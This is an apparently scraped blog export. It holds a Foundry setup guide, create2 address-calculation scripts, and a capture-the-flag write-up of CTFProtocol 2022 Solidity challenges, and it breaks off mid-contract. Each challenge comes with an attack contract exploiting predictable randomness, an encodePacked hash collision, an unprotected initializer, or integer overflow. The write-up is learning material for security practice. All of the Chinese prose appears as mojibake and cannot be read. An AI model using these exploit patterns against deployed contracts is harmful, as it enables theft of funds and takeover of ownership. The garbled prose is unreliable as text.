æœ¬äººç”¨çš„æ˜¯Windowsç³»ç»Ÿçš„ç”µè„‘ï¼Œè€Œç½‘ä¸Šçš„ä¸€äº›å®‰è£…æ•™å­¦åŸºæœ¬ä¸Šéƒ½ä¸å¥½ç”¨ã€‚æœ‰çš„è¯´è¦å»ä¸‹è½½æœ€æ–°ç‰ˆæœ¬çš„VSCodeï¼Œæœ‰çš„è¯´è¦å»ä¸‹è½½c++ç¼–è¯‘å™¨ï¼Œè¿˜æœ‰å»ä¸‹è½½rustç­‰ç­‰ã€‚åæ­£æˆ‘å…œå…œè½¬è½¬ä¸€å¤§åœˆå›æ¥ï¼Œemmmï¼Œcç›˜è«åå…¶å¦™å°‘äº†10ä¸ªGã€‚æœ€åè¿˜æ˜¯åœ¨å­¦é•¿çš„å»ºè®®ä¸­æŠŠfoundryå®‰è£…å¥½äº†ã€‚ å¯ä»¥ç›´æ¥åˆ°GitHubä¸Šæ‰¾åˆ°.exeæ–‡ä»¶ï¼Œä¸‹è½½ä¸‹æ¥ä¹‹åï¼Œå°†å…¶é…ç½®åˆ°ç¯å¢ƒå˜é‡ä¸­å³å¯ã€‚ä¸‹è½½é“¾æ¥ï¼šLINK ï¼Œå…¶ä¸­ä¸‹è½½çš„æ˜¯.zipé‚£ä¸ªå‹ç¼©åŒ…ã€‚ éšåï¼Œåœ¨æ¡Œé¢æ‰“å¼€å‘½ä»¤è¡Œ(win+cmd)ï¼Œè¾“å…¥forge testï¼Œè¿è¡Œç»“æœåº”è¯¥ä¸ºNothing to compile 0x00. Foundryæ“ä½œæŒ‡ä»¤ åˆå§‹åŒ– Foundryé¡¹ç›® 1forge init [é¡¹ç›®åå­—] ç¼–è¯‘åˆçº¦ 1forge compile éƒ¨ç½²åˆçº¦ ä½¿ç”¨forge createæŒ‡ä»¤ é…ç½®ä¸´æ—¶ç¯å¢ƒå˜é‡ï¼ˆå³å½“å‰çª—å£æœ‰æ•ˆï¼‰ powershellï¼šä¾‹å¦‚ &#x3D;&gt; $env:PRIVATE_KEY&#x3D;â€xxxxâ€ï¼Œå–å€¼ï¼š$env:PRIVATE_KEY cmd: ä¾‹å¦‚ &#x3D;&gt; set PRIVATE_KEY&#x3D;â€xxxxâ€ï¼Œå–å€¼ï¼š %PRIVATE_KEY% keystoreçš„ä½¿ç”¨ï¼šlink 1234567891011forge create --rpc-url &lt;your_rpc_url&gt; --private-key &lt;your_private_key&gt; --constructor-args &lt;arg1&gt; &lt;arg2&gt; ... &lt;argN&gt; &lt;contract_name&gt;## é…ç½®ç¯å¢ƒå˜é‡ä¹‹å## powershellforge create --rpc-url $env:RPC_URL --private-key $env:PRIVATE_KEY --constructor-args &lt;arg1&gt; &lt;arg2&gt; ... &lt;argN&gt; &lt;contract_name&gt;##cmdforge create --rpc-url %RPC_URL% --private-key %PRIVATE_KEY% --constructor-args &lt;arg1&gt; &lt;arg2&gt; ... &lt;argN&gt; &lt;contract_name&gt;## å¦‚æœæœ‰åˆçº¦åŒåçš„æƒ…å†µåˆ™éœ€è¦ä½¿ç”¨æ–‡ä»¶è·¯å¾„æ¥åŒºåˆ†forge create --rpc-url &lt;your_rpc_url&gt; --private-key &lt;your_private_key&gt; --constructor-args &lt;arg1&gt; &lt;arg2&gt; ... &lt;argN&gt; src/.../MyContract.sol:MyContract ä½¿ç”¨ forge scriptæŒ‡ä»¤ åŒä¸Šå‡è®¾å·²ç»é…ç½®å¥½ä¸´æ—¶ç¯å¢ƒå˜é‡ å¾…éƒ¨ç½²åˆçº¦ä¸º script/DeploySimpleStorage.s.sol DeploySimpleStorage.s.sol 123456789101112131415// SPDX-License-Identifier: MITpragma solidity 0.8.20;import &#123; Script &#125; from &quot;forge-std/Script.sol&quot;;import &#123; SimpleStorage &#125; from &quot;../src/SimpleStorage.sol&quot;;contract DeploySimpleStorage is Script &#123; function run() external returns (SimpleStorage) &#123; vm.startBroadcast(); SimpleStorage simpleStorage = new SimpleStorage(); vm.stopBroadcast(); return simpleStorage; &#125;&#125; 1forge script script/xxxx/xxx.s.sol:xxx --rpc-url $env:RPC_URL --broadcast --private-key $env:PRIVATE_KEY è°ƒç”¨åˆçº¦å‡½æ•° è°ƒç”¨å†™å‡½æ•° 1cast send &lt;contract_address&gt; &lt;function(args type)&gt; &lt;args...&gt; --rpc-url $env:RPC_URL --private-key $env:PRIVATE_KEY example: â€‹ è°ƒç”¨è¯»å‡½æ•° 1cast call &lt;contract_address&gt; &lt;function(args type)&gt; &lt;args...&gt; --rpc-url $env:RPC_URL --private-key $env:PRIVATE_KEY example: 0x01. Deploy on L20x02. Foundy.toml","categories":[{"name":"Utils","slug":"Utils","permalink":"https://biyouqiuqiu.com/categories/Utils/"},{"name":"foundry","slug":"Utils/foundry","permalink":"https://biyouqiuqiu.com/categories/Utils/foundry/"}],"tags":[{"name":"foundry","slug":"foundry","permalink":"https://biyouqiuqiu.com/tags/foundry/"}]},{"title":"utils-create2","slug":"Basic_Knowledge/solidity/utils-create2","date":"2023-09-04T04:10:10.000Z","updated":"2023-09-04T04:10:10.000Z","comments":true,"path":"2023/09/04/Basic_Knowledge/solidity/utils-create2/","link":"","permalink":"https://biyouqiuqiu.com/2023/09/04/Basic_Knowledge/solidity/utils-create2/","excerpt":"","text":"å¼•è¨€ åœ¨é¶åœºåˆ·é¢˜çš„æ—¶å€™ç»å¸¸ä¼šé‡åˆ°å„ç§æ¶‰åŠåˆ°create2æ“ä½œç çš„é¢˜ï¼Œè¿™é‡Œæ•´ç†äº†ä¸¤ä¸ªè®¡ç®—è„šæœ¬(ä¸€ä¸ªç”¨äºåˆ›å»ºç©ºå‚æ„é€ å™¨çš„åˆçº¦ï¼Œå¦ä¸€ä¸ªæ˜¯ç”¨äºåˆ›å»ºå¸¦å‚æ„é€ å™¨çš„åˆçº¦)ï¼Œéƒ½æ˜¯åŸºäºetherjs-v5 æ³¨ï¼šè„šæœ¬åªæ˜¯è¾…åŠ©è®¡ç®—ï¼Œå¹¶ä¸æ˜¯åˆ›å»ºåˆçº¦ï¼Œåˆ›å»ºåˆçº¦è¿˜å¾—é€šè¿‡æ™ºèƒ½åˆçº¦æ¥å®ç°ã€‚ ç©ºå‚æ„é€ å™¨1234567891011121314151617181920212223242526272829303132import &#123; ethers &#125; from &quot;ethers&quot;const const_num = &quot;0xFF&quot;;const contract_add = &quot;&quot;;let str1 = const_num + contract_add.slice(2,contract_add.length);const bytecode = &quot;&quot;;const bytecodeToHash = ethers.utils.solidityKeccak256([&#x27;bytes&#x27;],[bytecode]);let salt = 0;const value = &quot;&quot;; // æŒ‡å®šç‰¹æ®Šå€¼while (true) &#123; let saltToHash = ethers.utils.solidityKeccak256([&#x27;uint&#x27;],[salt]); saltToHash = saltToHash.slice(2, saltToHash.length) let str2 = str1.concat(saltToHash).concat(bytecodeToHash.slice(2,bytecodeToHash.length)); let hash = ethers.utils.solidityKeccak256([&#x27;bytes&#x27;] ,[str2]); //æŒ‰ç…§éœ€æ±‚è¿›è¡Œè¿‡æ»¤ if (hash.slice(hash.length - 2, hash.length) == value) &#123; console.log(`salt = $&#123;salt&#125;`); console.log(`address = 0x$&#123;hash.slice(26, hash.length)&#125;`); break; &#125; salt++;&#125; é…åˆä½¿ç”¨çš„solidityä»£ç  123456789101112131415161718 // /* ä½¿ç”¨å†…è”æ±‡ç¼–è‡ªå¸¦çš„ create2() */function create2NewContractByInline(uint salt) public returns (address) &#123; // bytes memory code = type(Test).creationCode; // å¦‚æœå¾…éƒ¨ç½²åˆçº¦çš„æ„é€ å™¨ä¸­æœ‰å‚æ•°ï¼Œåˆ™ä½¿ç”¨å¦‚ä¸‹æ–¹å¼è¿›è¡Œè·å–code bytes memory code = abi.encodePacked(type(Test).creationCode, abi.encode(msg.sender, &quot;biyou&quot;)); bytes32 _salt = keccak256(abi.encodePacked(salt)); address result; assembly &#123; result := create2( 0, // value è¡¨ç¤ºè¦å‘æ–°åˆçº¦å‘é€çš„ä»¥å¤ªå¸æ•°é‡ add(code, 32), // è¡¨ç¤ºè·³è¿‡æ•°ç»„é•¿åº¦ mload(code), // è¯»å–codeçš„é•¿åº¦ _salt // ç› ) &#125; return result;&#125; å¸¦å‚æ„é€ å™¨12345678910111213141516171819202122232425262728293031323334353637import &#123; ethers &#125; from &quot;ethers&quot;const const_num = &quot;0xFF&quot;;const contract_add = &quot;&quot;; // deploy åˆçº¦åœ°å€let str1 = const_num + contract_add.slice(2,contract_add.length);let bytecode = &quot;&quot;;// ç­‰åŒäº solidityä¸­çš„ abi.encode()const variable_code = new ethers.utils.AbiCoder().encode([&#x27;type&#x27;], [value]);bytecode = bytecode + variable_code.slice(2,variable_code.length);const bytecodeToHash = ethers.utils.solidityKeccak256([&#x27;bytes&#x27;],[bytecode]);let salt = 0;const value = &quot;&quot;; // æŒ‡å®šç‰¹æ®Šå€¼while (true) &#123; let saltToHash = ethers.utils.solidityKeccak256([&#x27;uint&#x27;],[salt]); saltToHash = saltToHash.slice(2, saltToHash.length) let str2 = str1.concat(saltToHash).concat(bytecodeToHash.slice(2,bytecodeToHash.length)); let hash = ethers.utils.solidityKeccak256([&#x27;bytes&#x27;] ,[str2]); //æŒ‰ç…§éœ€æ±‚è¿›è¡Œè¿‡æ»¤ if (hash.slice(hash.length - 2, hash.length) == value) &#123; console.log(`salt = $&#123;salt&#125;`); console.log(`address = 0x$&#123;hash.slice(26, hash.length)&#125;`); break; &#125; salt++;&#125; é…åˆä½¿ç”¨çš„solidityä»£ç  1234567891011121314151617181920function create2NewContractByInline(uint salt) public returns (address) &#123; /* å¦‚æœå¾…éƒ¨ç½²åˆçº¦çš„æ„é€ å™¨ä¸­æœ‰å‚æ•°ï¼Œåˆ™ä½¿ç”¨å¦‚ä¸‹æ–¹å¼è¿›è¡Œè·å–code type():å¾…éƒ¨ç½²çš„åˆçº¦å abi.encode():éƒ¨ç½²åˆçº¦éœ€è¦ä¼ å…¥çš„å‚æ•° */ bytes memory code = abi.encodePacked(type().creationCode, abi.encode()); bytes32 _salt = keccak256(abi.encodePacked(salt)); address result; assembly &#123; result := create2( 0, // value è¡¨ç¤ºè¦å‘æ–°åˆçº¦å‘é€çš„ä»¥å¤ªå¸æ•°é‡ add(code, 32), // è¡¨ç¤ºè·³è¿‡æ•°ç»„é•¿åº¦ mload(code), // è¯»å–codeçš„é•¿åº¦ _salt // ç› ) &#125; return result;&#125; è¡¥å……ä»¥ä¸Šä»£ç æ€ä¹ˆè¯´å‘¢ï¼Œæ¯•ç«Ÿæ˜¯jsä»£ç å˜›ï¼Œæ•°å­—çš„è½¬åŒ–æ€»ä¼šæœ‰é—®é¢˜ï¼Œæ¯”å¦‚ç®—æŸä¸ªåœ°å€å¯¹æŸä¸ªæ•°å–æ¨¡æ˜¯å¦ç­‰äºæŸä¸ªå€¼ä¹‹ç±»çš„ï¼Œjsä»£ç ä¸èƒ½è½»æ˜“å®ç°ï¼Œåæ­£å¯¹æˆ‘æ¥è¯´ä¸èƒ½ï¼Œäºæ˜¯å˜è‡ªå·±ç¼–å†™äº†ä¸€ä¸ªpython ç‰ˆçš„è®¡ç®—addressçš„è„šæœ¬ã€‚å…¼å®¹äº†ä¸Šè¿°ä¸¤ç§æƒ…å†µï¼Œå®Œç¾åº”å¯¹å¾…æ„å»ºåˆçº¦ç©ºå‚å’Œæœ‰å‚ä¸¤ç§æƒ…å†µã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546from web3 import Web3from eth_abi import encode# å›ºå®šå¸¸é‡ 0xffconst_value = &quot;0xff&quot;# value of your address(this), delet the `0x`deployer_address = &quot;&quot;deployer_address = deployer_address[2:]# å°†å‰ä¸¤ä¸ªå€¼æ‹¼æ¥èµ·æ¥prefixed = const_value + deployer_address# è¿™ä¸ªä¸ºå¾…éƒ¨ç½²åˆçº¦çš„å­—èŠ‚ç hacker_bytecode = &quot;&quot;# è¿™é‡Œæ˜¯æ„é€ å™¨çš„å‚æ•°ï¼Œencode([&#x27;type&#x27;], [&#x27;value&#x27;])parameter = encode([&#x27;&#x27;],[&quot;&quot;]).hex()# æ‹¼æ¥ å­—èŠ‚ç  å’Œ æ„é€ å™¨å‚æ•°bytecode = &quot;0x&quot; + hacker_bytecode + parameter# å¯¹ bytecode è¿›è¡Œ hash è¿ç®—bytecode_hash = Web3.solidity_keccak([&#x27;bytes&#x27;], [bytecode]).hex()# print(bytecode_hash)i = 0while(True): salt = Web3.solidity_keccak([&#x27;uint256&#x27;], [i]).hex() data = prefixed + salt[2:] + bytecode_hash[2:] hashed = Web3.solidity_keccak([&#x27;bytes&#x27;], [data]).hex() # address(uint(uint160(hashed))) address = hashed[26:] # æŒ‰éœ€æ±‚è®¾ç½® if int((&quot;0x&quot; + address), 16) % 1000 == 137: print(&quot;salt=&quot;, i) print(&quot;address=&quot;, (&quot;0x&quot; + address)) break i += 1 ç”¨äº†éƒ½è¯´å¥½ï¼ï¼ï¼ ç‰ˆæœ¬package.json: 123456&#123; &quot;type&quot;: &quot;module&quot;, &quot;dependencies&quot;: &#123; &quot;ethers&quot;: &quot;^5.7.2&quot; &#125;&#125;","categories":[{"name":"Utils","slug":"Utils","permalink":"https://biyouqiuqiu.com/categories/Utils/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://biyouqiuqiu.com/tags/solidity/"},{"name":"create2","slug":"create2","permalink":"https://biyouqiuqiu.com/tags/create2/"}]},{"title":"CTFProtocol-2022ï¼ˆ11ï¼‰","slug":"CTFS/CTFProtocol/CTFProtocol","date":"2023-09-01T04:50:10.000Z","updated":"2023-09-01T04:50:10.000Z","comments":true,"path":"2023/09/01/CTFS/CTFProtocol/CTFProtocol/","link":"","permalink":"https://biyouqiuqiu.com/2023/09/01/CTFS/CTFProtocol/CTFProtocol/","excerpt":"","text":"ç”±ç®€å…¥éš¾ The Lost Kitty1. question Lucas is a scientist who lives with his cat in a big house that has 2^256 rooms. His cat likes to play hide and seek and jumps to a random room whenever it hears a door opening in another one. Can you find Lucasâ€™ cat? Set the variable catFound to true to win this challenge. æºç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354// SPDX-License-Identifier: MITpragma solidity ^0.8.0;/// @title The Lost Kitty/// @author https://twitter.com/Cryptonicle1/// @notice Lucas is a scientist who has lost his cat in a big house that has 2^256 rooms, anon can you find it?/// @custom:url https://www.ctfprotocol.com/tracks/eko2022/hidden-kittycatcontract HiddenKittyCat &#123; address private immutable _owner; constructor() &#123; _owner = msg.sender; bytes32 slot = keccak256(abi.encodePacked(block.timestamp, blockhash(block.number - 69))); assembly &#123; sstore(slot, &quot;KittyCat!&quot;) &#125; &#125; function areYouHidingHere(bytes32 slot) external view returns (bool) &#123; require(msg.sender == _owner, &quot;!owner&quot;); bytes32 kittyPointer; assembly &#123; kittyPointer := sload(slot) &#125; return kittyPointer == &quot;KittyCat!&quot;; &#125; function destroyMe() external &#123; require(msg.sender == _owner, &quot;!owner&quot;); selfdestruct(payable(address(0))); &#125;&#125;contract House &#123; bool public catFound; function isKittyCatHere(bytes32 _slot) external &#123; if (catFound) &#123; return; &#125; HiddenKittyCat hiddenKittyCat = new HiddenKittyCat(); bool found = hiddenKittyCat.areYouHidingHere(_slot); if (!found) &#123; hiddenKittyCat.destroyMe(); &#125; else &#123; catFound = true; &#125; &#125;&#125; 2. analysis ä¸€çœ‹åˆ°è¿™ä¸ªbytes32 slot = keccak256(abi.encodePacked(block.timestamp, blockhash(block.number - 69)));ç»å…¸è€é—®é¢˜äº†ï¼Œbadnonceå•¦ï¼Œåœ¨ç‰¹å®šæ¡ä»¶ä¸‹å¯æ§ï¼Œè¯¥ä»£ç å†™åœ¨æ„é€ å™¨ä¸­ï¼Œä½†æ˜¯éƒ¨ç½²æ“ä½œåœ¨Houseåˆçº¦çš„isKittyCatHere()ä¸­ï¼Œæ‰€ä»¥slotæ˜¯å¯æ§çš„ã€‚ 3. solveæ”»å‡»åˆçº¦ 1234567891011121314151617contract KittyHacker &#123; House house; constructor(address _house) &#123; house = House(_house); &#125; function attack() public &#123; // compute the value of slot in advance bytes32 slot = keccak256(abi.encodePacked(block.timestamp, blockhash(block.number - 69))); house.isKittyCatHere(slot); require(house.catFound(), &quot;Kitty is not be found...&quot;); &#125;&#125; æ³¨æ„ï¼šå¦‚æœè¿™é‡Œè¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯ç¡®ä¿ä½ çš„åŒºå—é«˜åº¦å¤§äº69ï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚ã€‚ã€‚ RootMe1.question Can you trick the machine to get root access? æºç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748// SPDX-License-Identifier: MITpragma solidity ^0.8.0;/// @title RootMe/// @author https://twitter.com/tinchoabbate/// @notice Anon, can you trick the machine to get root access?/// @custom:url https://www.ctfprotocol.com/tracks/eko2022/rootmecontract RootMe &#123; bool public victory; mapping(string =&gt; bool) public usernames; mapping(bytes32 =&gt; address) public accountByIdentifier; constructor() &#123; register(&quot;ROOT&quot;, &quot;ROOT&quot;); &#125; modifier onlyRoot() &#123; require(accountByIdentifier[_getIdentifier(&quot;ROOT&quot;, &quot;ROOT&quot;)] == msg.sender, &quot;Not authorized&quot;); _; &#125; function register(string memory username, string memory salt) public &#123; require(usernames[username] == false, &quot;Username already exists&quot;); usernames[username] = true; bytes32 identifier = _getIdentifier(username, salt); accountByIdentifier[identifier] = msg.sender; &#125; function _getIdentifier(string memory user, string memory salt) private pure returns (bytes32) &#123; return keccak256(abi.encodePacked(user, salt)); &#125; /** * @notice Allows root account to perform any change in the contract&#x27;s storage * @param storageSlot storage position where data will be written * @param data data to be written */ function write(bytes32 storageSlot, bytes32 data) external onlyRoot &#123; assembly &#123; // stores `data` in storage at position `storageSlot` sstore(storageSlot, data) &#125; &#125;&#125; 2. analysis æ¼æ´æ‰€åœ¨ï¼š 123function _getIdentifier(string memory user, string memory salt) private pure returns (bytes32) &#123; return keccak256(abi.encodePacked(user, salt));&#125; abi.encodePacked(user, salt)ï¼Œè¯¥æ‰“åŒ…æ–¹å¼ï¼Œçœç•¥äº†å˜é‡çš„å­˜å‚¨ä½ç½®ï¼Œå˜é‡å€¼çš„é•¿åº¦ï¼Œåªæœ‰å˜é‡çœŸæ­£çš„æ•°æ®éƒ¨åˆ†ï¼Œè€Œä¸”è¿˜å°†è¿™ä¸¤ä¸ªå€¼æ‹¼æ¥åœ¨ä¸€èµ·ï¼Œå¯¼è‡´abi.encodePacked(â€œROOTâ€, â€œROOTâ€)å’Œabi.encodePacked(â€œROOâ€, â€œTROOTâ€)çš„å€¼æ˜¯ä¸€æ ·çš„ã€‚ 3. solveæ”»å‡»åˆçº¦ 1234567891011121314contract RootMeHacker &#123; RootMe rm; constructor (address _rm) &#123; rm = RootMe(_rm); &#125; function attack() public &#123; rm.register(&quot;ROO&quot;, &quot;TROOT&quot;); // hacker æˆä¸º ROOT rm.write(bytes32(uint(0)), bytes32(uint(1))); // å°†å˜é‡victoryæ”¹æˆtrue require(rm.victory() == true, &quot;you are not victory..&quot;); &#125;&#125; Trickster1.question We might have spotted a honeypotâ€¦ Can you manage to obtain the real jackpot?.Hacking casino slot machines is considered illegal. æºç  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768// SPDX-License-Identifier: MITpragma solidity 0.8.17;/// @title Trickster/// @author https://twitter.com/mattaereal/// @notice We might have spotted a honeypot... Anon, can you manage to obtain the real jackpot?/// @custom:url https://www.ctfprotocol.com/tracks/eko2022/trickstercontract Jackpot &#123; address private jackpotProxy; address private owner; modifier onlyOwner() &#123; require(msg.sender == owner); _; &#125; function initialize(address _jackpotProxy) public payable &#123; jackpotProxy = _jackpotProxy; &#125; modifier onlyJackpotProxy() &#123; require(msg.sender == jackpotProxy); _; &#125; function claimPrize(uint256 amount) external payable onlyJackpotProxy &#123; payable(msg.sender).transfer(amount * 2); &#125; fallback() external payable &#123;&#125; receive() external payable &#123;&#125;&#125;contract JackpotProxy &#123; address private owner; address private jackpot; modifier onlyOwner() &#123; require(msg.sender == owner); _; &#125; constructor() payable &#123; owner = msg.sender; address _proxy = address(new Jackpot()); initialize(_proxy); payable(_proxy).transfer(address(this).balance); &#125; function initialize(address _jackpot) public onlyOwner &#123; jackpot = _jackpot; &#125; function claimPrize() external payable &#123; require(msg.value &gt; 0, &quot;zero deposit&quot;); (bool success,) = jackpot.call&#123;value: msg.value&#125;(abi.encodeWithSignature(&quot;claimPrize(uint)&quot;, msg.value)); require(success, &quot;failed&quot;); payable(msg.sender).transfer(address(this).balance); &#125; function balance() external view returns (uint256) &#123; return jackpot.balance; &#125; receive() external payable &#123;&#125;&#125; 2. analysis ä½•ä¸ºèœœç½ï¼Œåé’±ï¼Œéª—å±€ï¼ŒJackpotProxyä¸­çš„claimPrize()å°±æ˜¯ä¸€ä¸ªéª—å±€ï¼Œä»”ç»†çœ‹ã€‚ æˆåŠŸè°ƒç”¨JackPotä¸­çš„claimPrize()å‡½æ•°ï¼Œè¯¥åˆçº¦ä¸­çš„initialize()ä»»ä½•äººéƒ½å¯ä»¥è°ƒç”¨ï¼Œæ‰€ä»¥ä»»ä½•äººéƒ½å¯ä»¥æˆä¸ºjackpotProxyï¼Œä»»ä½•äººéƒ½å¯ä»¥è°ƒç”¨claimPrizeå‡½æ•°ï¼Œé—®é¢˜è½¬ä¸ºè·å–address private jackpotï¼Œåœ¨åŒºå—é“¾ä¸­æ•°æ®éƒ½æ˜¯å…¬å¼€é€æ˜çš„ï¼Œå¯ä»¥é‡‡ç”¨hardhatæ¥å¸®åŠ©è¯»å–è¯¥å€¼ã€‚ 3. solveæ”»å‡»åˆçº¦ 1234567891011121314151617181920212223242526contract JackPotHacker &#123; Jackpot jackpot; JackpotProxy jackpotProxy; address owner; constructor(address payable _jackpot, address payable _jackpotProxy) &#123; jackpot = Jackpot(_jackpot); jackpotProxy = JackpotProxy(_jackpotProxy); owner = msg.sender; &#125; function attack() public &#123; jackpot.initialize(address(this)); uint half_balance = jackpotProxy.balance() / 2; jackpot.claimPrize(half_balance); require(jackpotProxy.balance() == 0, &quot;&quot;); returnMoney(); &#125; function returnMoney() internal &#123; payable(owner).call&#123;value: address(this).balance&#125;(&quot;&quot;); &#125; receive() external payable &#123;&#125;&#125; ä½¿ç”¨hardhat 12345678910111213141516171819202122232425262728293031323334const &#123; ethers &#125; = require(&#x27;hardhat&#x27;);describe(&quot;[CTFProtocol-2022] Trickster&quot;, function() &#123; let deployer, player; let jackpotproxy, jackpot; before(async function() &#123; [deployer, player] = await ethers.getSigners(); // deploy the contract with 2 wei let contract_factory = await (await ethers.getContractFactory(&#x27;JackpotProxy&#x27;)).deploy(&#123;value: 2&#125;); console.log(`jackpotproxy = $&#123;jackpotproxy = contract_factory.target&#125;`); // get private&#x27;value =&gt; jackpot let slot1 = await ethers.provider.getStorage(contract_factory.target, 1); jackpot = slot1 = `0x$&#123;slot1.slice(slot1.length-40, slot1.length)&#125;`; console.log(`jackpot = $&#123;jackpot&#125; `); &#125;); it(&quot;Execution&quot;, async function() &#123; let hacker = await (await ethers.getContractFactory(&#x27;JackPotHacker&#x27;)).deploy(jackpot, jackpotproxy); await hacker.attack(); &#125;); after(async function() &#123; &#125;);&#125;); The Golden Ticket1.question The organizers of Ekoparty decided that the tickets for the 2023 conference would be purchased through a smart contract. However, the conference is oversold and you have to sign up for a waitlist to get your ticket. The problem is that they put you on hold for ten years and the only option you have is to extend the wait. After the wait is over, you have to enter a raffle to see if you get the ticket æºç  1234567891011121314151617181920212223242526272829303132333435363738394041424344// SPDX-License-Identifier: MITpragma solidity 0.8.17;/// @title The Golden Ticket/// @author https://twitter.com/AlanRacciatti/// @notice Mint your ticket to the EKOparty, if you are patient and lucky enough./// @custom:url https://www.ctfprotocol.com/tracks/eko2022/the-golden-ticketcontract GoldenTicket &#123; mapping(address =&gt; uint40) public waitlist; mapping(address =&gt; bool) public hasTicket; function joinWaitlist() external &#123; require(waitlist[msg.sender] == 0, &quot;Already on waitlist&quot;); unchecked &#123; ///@dev 10 years wait list waitlist[msg.sender] = uint40(block.timestamp + 10 * 365 days); &#125; &#125; function updateWaitTime(uint256 _time) external &#123; require(waitlist[msg.sender] != 0, &quot;Join waitlist first&quot;); unchecked &#123; waitlist[msg.sender] += uint40(_time); &#125; &#125; function joinRaffle(uint256 _guess) external &#123; require(waitlist[msg.sender] != 0, &quot;Not in waitlist&quot;); require(waitlist[msg.sender] &lt;= block.timestamp, &quot;Still have to wait&quot;); require(!hasTicket[msg.sender], &quot;Already have a ticket&quot;); uint256 randomNumber = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))); if (randomNumber == _guess) &#123; hasTicket[msg.sender] = true; &#125; delete waitlist[msg.sender]; &#125; function giftTicket(address _to) external &#123; require(hasTicket[msg.sender], &quot;Yoy dont own a ticket&quot;); hasTicket[msg.sender] = false; hasTicket[_to] = true; &#125;&#125; 2. analysis æœ¬é¢˜æ¼æ´ï¼šåéšæœºæ•°ï¼Œæ•´æ•°æº¢å‡º å³ä½¿åœ¨ ^0.8.0çš„ç¼–è¯‘å™¨ä¸­ï¼Œä½¿ç”¨äº†unchecked&#123;&#125;å…³é”®å­—ï¼Œå³æ”¾å¼ƒäº†æ•´æ•°æº¢å‡ºçš„æ£€æµ‹ï¼Œè¿™ä¾¿æœ‰äº†æº¢å‡ºçš„é£é™©ï¼Œ è€ŒupdateWaitTime(uint256 _time)å‡½æ•°å°±æ˜¯å¯¼è‡´æ•´æ•°æº¢å‡ºçš„å…³é”®å‡½æ•°ï¼Œåªè¦ç¨åŠ è®¡ç®—ä¾¿å¯ä»¥ç®—å‡ºæº¢å‡ºæ¡ä»¶ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæº¢å‡ºçš„ç»“æœä¸èƒ½ä¸º0ï¼Œå¯ä»¥æ˜¯[1, block.timestamp]ä¹‹é—´çš„ä»»ä½•æ•°ã€‚ è‡³äºåéšæœºæ•°ï¼Œå¯åœ¨åŒä¸€ä¸ªå‡½æ•°ä¸­æå‰è®¡ç®—ã€‚ 3. solveæ”»å‡»åˆçº¦ 1234567891011121314151617181920212223contract GoldenTicketHacker &#123; GoldenTicket goldenticket; constructor(address _goldenticket) &#123; goldenticket = GoldenTicket(_goldenticket); &#125; function attack() public &#123; goldenticket.joinWaitlist(); goldenticket.updateWaitTime(calFlow()); uint256 guess = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))); goldenticket.joinRaffle(guess); &#125; function calFlow() internal view returns(uint256) &#123; uint max_uint40 = type(uint40).max; uint40 wait_time = uint40(block.timestamp + 10 * 365 days); uint res = uint40(max_uint40 - wait_time); return res + 2; // å®ç°ä¸Šæº¢,ä½¿å¾—waitlist[msg.sender] = 1 &#125;&#125; Smart Horrocrux1.question Some security researchers have recently found an eighth Horrocrux, it seems that Voldemort has link to a smart contract, can you destroy it? æºç  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495// SPDX-License-Identifier: MITpragma solidity 0.8.17;/// @title SmartHorrocrux/// @author https://twitter.com/AugustitoQ/// @notice Some security researchers have recently found an eighth Horrocrux, it seems that Voldemort has link to a smart contract, can you destroy it?/// @custom:url https://www.ctfprotocol.com/tracks/eko2022/smart-horrocruxcontract SmartHorrocrux &#123; bool private invincible; bytes32 private constant _spell = 0x45746865724b6164616272610000000000000000000000000000000000000000; // var only for test purposes bool public alive = true; constructor() payable &#123; require(msg.value == 2, &quot;Pay Horrorcrux creation price&quot;); setInvincible(); &#125; function destroyIt(string memory spell, uint256 magic) public &#123; bytes32 spellInBytes; assembly &#123; spellInBytes := mload(add(spell, 32)) &#125; require(spellInBytes == _spell, &quot;That spell wouldn&#x27;t kill a fly&quot;); require(!invincible, &quot;The Horrocrux is still invincible&quot;); bytes memory kedavra = abi.encodePacked(bytes4(bytes32(uint256(spellInBytes) - magic))); address(this).call(kedavra); &#125; function kill() external &#123; require(msg.sender == address(this), &quot;No one can kill me&quot;); alive = false; selfdestruct(payable(tx.origin)); &#125; function setInvincible() public &#123; invincible = (address(this).balance == 1) ? false : true; &#125; fallback() external &#123; uint256 b = address(this).balance; invincible = true; if (b &gt; 0) &#123; tx.origin.call&#123;value: b&#125;(&quot;&quot;); &#125; 